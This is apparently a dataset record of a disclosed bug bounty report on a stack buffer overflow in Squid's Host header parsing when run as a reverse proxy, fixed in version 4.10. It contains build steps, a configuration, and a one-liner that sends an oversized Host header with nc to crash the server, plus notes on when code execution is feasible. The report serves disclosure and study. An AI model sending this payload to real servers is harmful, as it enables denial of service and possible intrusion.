{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "guido ",
  "title": "Squid as reverse proxy RCE and data leak",
  "content": "\nSummary:\nThis was a very difficult experience as Squid maintainers took a long time to answer. I tried getting help from HackerOne support, Dropbox support and the Internet Bug Bounty (never e-mailed me back) to no avail. What could have taken a few days took months.\nThe vulnerability concerns a stack buffer overflow (write) in parsing of the Host header if Squid acts as a reverse proxy.\nThe bug is fixed in Squid 4.10 released on 20 Jan 2020 which can be found here: http://www.squid-cache.org/Versions/v4/\nSteps To Reproduce:\nCode 283 Bytes\n1mkdir squid-poc\n2cd squid-poc/\n3wget 'https://github.com/squid-cache/squid/archive/SQUID_4_8.tar.gz'\n4tar zxf SQUID_4_8.tar.gz\n5mkdir squid-install\n6cd squid-SQUID_4_8/\n7autoreconf -if\n8./configure --prefix=$(realpath ../squid-install)\n9make -j$(nproc)\n10make install\n11cd ../squid-install/sbin/\nCreate a file squid.conf with this contents. This is based on the instructions at https://wiki.squid-cache.org/ConfigExamples/Reverse/BasicAccelerator\nCode 276 Bytes\n1http_port 9999 accel defaultsite=127.0.0.1 vhost vport=1\n2cache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel\n3acl our_sites dstdomain your.main.website.name\n4http_access allow our_sites\n5cache_peer_access myAccel allow our_sites\n6cache_peer_access myAccel deny all\nRun Squid:\nThe following is a oneliner to launch Squid and send the payload that crashes it:\nCode 514 Bytes\n1./squid -N -f squid.conf & sleep 1 && echo -en \"GET / HTTP/1.1\\x0D\\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\\x0D\\x0A\\x0D\\x0A\" | nc localhost 9999\nOutput:\nCode 131 Bytes\n1[1] 19871\n2*** buffer overflow detected ***: ./squid terminated\n3[1]+  Aborted                 (core dumped) ./squid -N -f squid.conf\nSupporting Material/References:\nExploitation with -fstack-protector enabled is impossible.\nSome compilers don't enable -fstack-protector by default (like Clang without optimization flags).\nWithout stack protector, exploitation is relatively easy on 32 bit as valid addresses normally don't require a leading zero byte (which cannot be written by the payload, because the affected code treats it as a null-terminated string).\nOn 64 bit it is more difficult, but not necessarily impossible. Rather than overwriting the return address, changing the value of a (for instance boolean) configuration variable may be used.\nUnlike glibc, musl libc is used does not write a NULL byte to the destination buffer if the size argument is very large, which happens here due to an overflowing subtraction. Hence, exploitation may be easier on systems that use musl libc, like OpenWRT and Alpine Linux.\nThere is also a small data leak for payloads of a particular length. This does not crash Squid, and makes it return uninitialized bytes located after the string buffer, usually just several (until a NULL byte is reached).\nFix: https://github.com/squid-cache/squid/pull/519\nImpact\nRemote code execution (under certain circumstances), crashing a server (under most circumstances), leaking data from the server (under most circumstances).\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Classic Buffer Overflow"
  ],
  "screenshots": {},
  "disclosed_date": 1630033800,
  "report_url": "https://hackerone.com/reports/778610",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "mkdir squid-poc"
    ],
    [
      2,
      "cd squid-poc/"
    ],
    [
      3,
      "wget 'https://github.com/squid-cache/squid/archive/SQUID_4_8.tar.gz'"
    ],
    [
      4,
      "tar zxf SQUID_4_8.tar.gz"
    ],
    [
      5,
      "mkdir squid-install"
    ],
    [
      6,
      "cd squid-SQUID_4_8/"
    ],
    [
      7,
      "autoreconf -if"
    ],
    [
      8,
      "./configure --prefix=$(realpath ../squid-install)"
    ],
    [
      9,
      "make -j$(nproc)"
    ],
    [
      10,
      "make install"
    ],
    [
      11,
      "cd ../squid-install/sbin/"
    ],
    [
      12,
      "Create a file squid.conf with the contents specified in the report"
    ],
    [
      13,
      "Run Squid with the provided one-liner command to launch it and send the payload that crashes it"
    ]
  ],
  "vuln_description": "The vulnerability is a stack buffer overflow (write) in the parsing of the Host header when Squid acts as a reverse proxy. This can lead to remote code execution, crashing the server, or leaking data from the server under certain conditions. The bug is fixed in Squid 4.10.",
  "reason": "The vulnerability involves a buffer overflow in a specific header parsing scenario when Squid is configured as a reverse proxy. The discovery requires understanding of Squid's configuration and behavior as a reverse proxy, as well as the ability to craft a malicious Host header to trigger the overflow. The exploitation complexity varies based on the system's stack protection mechanisms and libc implementation.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}